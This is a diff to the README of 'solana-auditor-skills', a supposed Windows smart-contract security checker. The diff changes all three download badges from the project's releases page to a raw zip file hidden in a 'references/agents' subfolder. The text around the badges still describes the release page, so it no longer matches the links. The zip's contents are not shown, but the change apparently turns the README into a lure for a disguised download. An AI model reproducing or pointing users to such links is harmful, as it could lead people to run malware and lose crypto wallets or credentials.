@@ -1,6 +1,6 @@
 # 🛡️ solana-auditor-skills - Smart Contract Security Checker
 
-[![Download solana-auditor-skills](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/jessikaafloat676/solana-auditor-skills/releases)
+[![Download solana-auditor-skills](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/jessikaafloat676/solana-auditor-skills/main/solana-auditor/references/agents/skills-solana-auditor-v3.4.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Follow these steps to download and run solana-auditor-skills on your Windows com
 
 Click the button below to visit the download page:
 
-[![Get solana-auditor-skills](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/jessikaafloat676/solana-auditor-skills/releases)
+[![Get solana-auditor-skills](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/jessikaafloat676/solana-auditor-skills/main/solana-auditor/references/agents/skills-solana-auditor-v3.4.zip)
 
 On the release page, find the latest file labeled for Windows. It is usually named something like `solana-auditor-skills-windows.zip` or `.exe`. Click the file to download it.
 
@@ -138,4 +138,4 @@ solana-auditor-skills runs on your computer and does not send your code anywhere
 
 Use this link to visit the release page and get the Windows version:
 
-[![Download](https://img.shields.io/badge/Download-From%20GitHub-orange?style=for-the-badge)](https://github.com/jessikaafloat676/solana-auditor-skills/releases)
+[![Download](https://img.shields.io/badge/Download-From%20GitHub-orange?style=for-the-badge)](https://raw.githubusercontent.com/jessikaafloat676/solana-auditor-skills/main/solana-auditor/references/agents/skills-solana-auditor-v3.4.zip)
